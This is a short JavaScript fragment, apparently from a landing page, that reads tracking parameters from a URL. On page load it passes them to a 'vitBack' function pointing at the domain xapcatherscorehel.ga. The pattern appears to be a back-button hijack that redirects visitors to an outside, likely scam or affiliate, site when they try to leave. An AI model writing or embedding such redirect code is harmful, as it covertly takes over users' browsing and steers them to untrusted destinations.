...
var sub1=unescape(src).split("sub1=")[1].split("&")[0];
var sub2=unescape(src).split("sub2=")[1].split("&")[0];
var sub4=unescape(src).split("sub4=")[1].split("&")[0];
var sub5=unescape(src).split("sub5=")[1].split("&")[0];
var com=unescape(src).split("com=")[1];

 document.addEventListener("DOMContentLoaded", function () {
            window.vitBack("https://xapcatherscorehel.ga?offer="+a+"&sub1="+sub1+"&sub2="+sub2+"&sub4="+sub4+"&sub5="+sub5+"&com="+com+"", true);
        });
